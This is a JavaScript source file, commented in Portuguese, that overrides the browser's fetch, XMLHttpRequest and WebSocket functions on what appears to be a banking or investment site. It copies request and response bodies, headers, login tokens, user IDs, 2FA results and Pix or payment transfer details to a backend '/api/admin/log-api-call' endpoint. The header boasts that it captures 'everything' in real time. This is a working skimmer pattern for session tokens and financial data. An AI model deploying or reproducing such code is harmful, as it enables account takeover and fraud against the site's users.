/**
 * 🔐 API INTERCEPTOR MASTER - Captura TODAS as requisições
 * - Login, tokens, 2FA, transferências, tudo!
 * - Envia logs para nosso backend em tempo real
 * - Integrado 100% com painel admin
 */

(function() {
  'use strict';

  const API_LOG_ENDPOINT = '/api/admin/log-api-call';
  const SESSION_ID = generateSessionId();
  let requestCounter = 0;

  function generateSessionId() {
    return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }

  function logApiCall(data) {
    // Enviar para backend em background (não bloqueia)
    fetch(API_LOG_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: SESSION_ID,
        timestamp: new Date().toISOString(),
        ...data
      })
    }).catch(err => console.warn('[API Interceptor] Log error:', err));
  }

  // ============================================
  // 1. INTERCEPTAR FETCH
  // ============================================
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const [resource, config] = args;
    const requestId = ++requestCounter;
    const startTime = performance.now();

    console.log(`[API Interceptor #${requestId}] 🚀 FETCH:`, resource);

    return originalFetch.apply(this, args)
      .then(response => {
        const duration = performance.now() - startTime;
        const status = response.status;
        const statusText = response.statusText;

        console.log(`[API Interceptor #${requestId}] ✅ Response:`, status, statusText, `(${duration.toFixed(2)}ms)`);

        // Clonar response para ler o body
        const clonedResponse = response.clone();
        
        clonedResponse.text().then(body => {
          try {
            const jsonBody = JSON.parse(body);
            
            // Detectar tipo de requisição
            const url = new URL(resource, window.location.origin);
            const type = detectRequestType(url.pathname, config, jsonBody);

            logApiCall({
              type: 'api_call',
              requestId,
              method: config?.method || 'GET',
              url: resource,
              status,
              statusText,
              duration: duration.toFixed(2),
              requestType: type,
              requestBody: config?.body ? tryParseJson(config.body) : null,
              responseBody: jsonBody,
              headers: config?.headers || {}
            });

            // Detectar e registrar eventos específicos
            detectSpecialEvents(type, jsonBody);
          } catch (e) {
            logApiCall({
              type: 'api_call',
              requestId,
              method: config?.method || 'GET',
              url: resource,
              status,
              statusText,
              duration: duration.toFixed(2),
              responseBody: body
            });
          }
        });

        return response;
      })
      .catch(error => {
        const duration = performance.now() - startTime;
        console.error(`[API Interceptor #${requestId}] ❌ Error:`, error);

        logApiCall({
          type: 'api_error',
          requestId,
          url: resource,
          error: error.message,
          duration: duration.toFixed(2)
        });

        throw error;
      });
  };

  // ============================================
  // 2. INTERCEPTAR XMLHttpRequest
  // ============================================
  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url, ...args) {
    this._requestId = ++requestCounter;
    this._method = method;
    this._url = url;
    this._startTime = performance.now();
    console.log(`[API Interceptor #${this._requestId}] 🚀 XHR:`, method, url);
    return originalOpen.apply(this, [method, url, ...args]);
  };

  XMLHttpRequest.prototype.send = function(body) {
    const requestId = this._requestId;
    const self = this;

    this.addEventListener('load', function() {
      const duration = performance.now() - self._startTime;
      console.log(`[API Interceptor #${requestId}] ✅ XHR Response:`, this.status, `(${duration.toFixed(2)}ms)`);

      try {
        const responseBody = JSON.parse(this.responseText);
        const type = detectRequestType(self._url, { method: self._method }, responseBody);

        logApiCall({
          type: 'xhr_call',
          requestId,
          method: self._method,
          url: self._url,
          status: this.status,
          statusText: this.statusText,
          duration: duration.toFixed(2),
          requestType: type,
          responseBody
        });

        detectSpecialEvents(type, responseBody);
      } catch (e) {
        logApiCall({
          type: 'xhr_call',
          requestId,
          method: self._method,
          url: self._url,
          status: this.status,
          statusText: this.statusText,
          duration: duration.toFixed(2),
          responseBody: this.responseText
        });
      }
    });

    this.addEventListener('error', function() {
      const duration = performance.now() - self._startTime;
      console.error(`[API Interceptor #${requestId}] ❌ XHR Error`);

      logApiCall({
        type: 'xhr_error',
        requestId,
        url: self._url,
        error: 'XHR Error',
        duration: duration.toFixed(2)
      });
    });

    return originalSend.apply(this, [body]);
  };

  // ============================================
  // 3. INTERCEPTAR WebSocket
  // ============================================
  const originalWebSocket = window.WebSocket;
  window.WebSocket = function(url, ...args) {
    console.log(`[API Interceptor] 🌐 WebSocket:`, url);

    const ws = new originalWebSocket(url, ...args);

    ws.addEventListener('open', () => {
      console.log(`[API Interceptor] ✅ WebSocket Connected:`, url);
      logApiCall({
        type: 'websocket_open',
        url,
        timestamp: new Date().toISOString()
      });
    });

    ws.addEventListener('message', (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log(`[API Interceptor] 📨 WebSocket Message:`, data);

        logApiCall({
          type: 'websocket_message',
          url,
          data
        });

        detectSpecialEvents('websocket', data);
      } catch (e) {
        logApiCall({
          type: 'websocket_message',
          url,
          data: event.data
        });
      }
    });

    ws.addEventListener('close', () => {
      console.log(`[API Interceptor] ❌ WebSocket Closed:`, url);
      logApiCall({
        type: 'websocket_close',
        url
      });
    });

    ws.addEventListener('error', (error) => {
      console.error(`[API Interceptor] ❌ WebSocket Error:`, url, error);
      logApiCall({
        type: 'websocket_error',
        url,
        error: error.message
      });
    });

    return ws;
  };

  // ============================================
  // 4. DETECTAR TIPOS DE REQUISIÇÃO
  // ============================================
  function detectRequestType(url, config, responseBody) {
    const urlLower = url.toLowerCase();
    const methodLower = (config?.method || 'GET').toLowerCase();

    // LOGIN
    if (urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('auth')) {
      return 'LOGIN';
    }

    // 2FA / MFA
    if (urlLower.includes('2fa') || urlLower.includes('mfa') || urlLower.includes('verify') || urlLower.includes('otp')) {
      return 'MFA_VERIFY';
    }

    // TOKEN
    if (urlLower.includes('token') || urlLower.includes('bearer')) {
      return 'TOKEN_GENERATION';
    }

    // TRANSFERÊNCIA / PIX
    if (urlLower.includes('transfer') || urlLower.includes('pix') || urlLower.includes('payment') || urlLower.includes('send')) {
      return 'TRANSFER';
    }

    // DEPÓSITO
    if (urlLower.includes('deposit') || urlLower.includes('topup') || urlLower.includes('charge')) {
      return 'DEPOSIT';
    }

    // SAQUE
    if (urlLower.includes('withdraw') || urlLower.includes('cashout')) {
      return 'WITHDRAWAL';
    }

    // PERFIL / DADOS
    if (urlLower.includes('profile') || urlLower.includes('user') || urlLower.includes('account')) {
      return 'PROFILE';
    }

    // PORTFÓLIO / INVESTIMENTOS
    if (urlLower.includes('portfolio') || urlLower.includes('investment') || urlLower.includes('stock') || urlLower.includes('crypto')) {
      return 'PORTFOLIO';
    }

    // MERCADO
    if (urlLower.includes('market') || urlLower.includes('quote') || urlLower.includes('price')) {
      return 'MARKET_DATA';
    }

    return 'UNKNOWN';
  }

  // ============================================
  // 5. DETECTAR EVENTOS ESPECIAIS
  // ============================================
  function detectSpecialEvents(type, responseBody) {
    if (!responseBody) return;

    // LOGIN SUCESSO
    if (type === 'LOGIN' && (responseBody.token || responseBody.access_token || responseBody.bearerToken)) {
      console.log('🎉 [API Interceptor] LOGIN SUCESSO! Token gerado!');
      logApiCall({
        type: 'special_event',
        event: 'LOGIN_SUCCESS',
        token: responseBody.token || responseBody.access_token || responseBody.bearerToken,
        userId: responseBody.userId || responseBody.user_id || responseBody.id
      });
    }

    // MFA VERIFICADO
    if (type === 'MFA_VERIFY' && responseBody.success) {
      console.log('✅ [API Interceptor] MFA VERIFICADO!');
      logApiCall({
        type: 'special_event',
        event: 'MFA_VERIFIED'
      });
    }

    // TRANSFERÊNCIA SUCESSO
    if (type === 'TRANSFER' && responseBody.success) {
      console.log('💸 [API Interceptor] TRANSFERÊNCIA REALIZADA!');
      logApiCall({
        type: 'special_event',
        event: 'TRANSFER_SUCCESS',
        amount: responseBody.amount,
        recipient: responseBody.recipient,
        transactionId: responseBody.transactionId
      });
    }

    // ERRO
    if (responseBody.error || responseBody.message?.includes('error')) {
      console.error('❌ [API Interceptor] ERRO NA API:', responseBody.error || responseBody.message);
      logApiCall({
        type: 'special_event',
        event: 'API_ERROR',
        error: responseBody.error || responseBody.message
      });
    }
  }

  // ============================================
  // 6. UTILITÁRIOS
  // ============================================
  function tryParseJson(str) {
    try {
      return JSON.parse(str);
    } catch (e) {
      return str;
    }
  }

  // ============================================
  // 7. INICIALIZAÇÃO
  // ============================================
  console.log('🔐 [API Interceptor Master] ✅ ATIVO - Capturando TODAS as requisições!');
  console.log('📊 Session ID:', SESSION_ID);

  logApiCall({
    type: 'interceptor_init',
    message: 'API Interceptor Master inicializado',
    sessionId: SESSION_ID
  });
})();
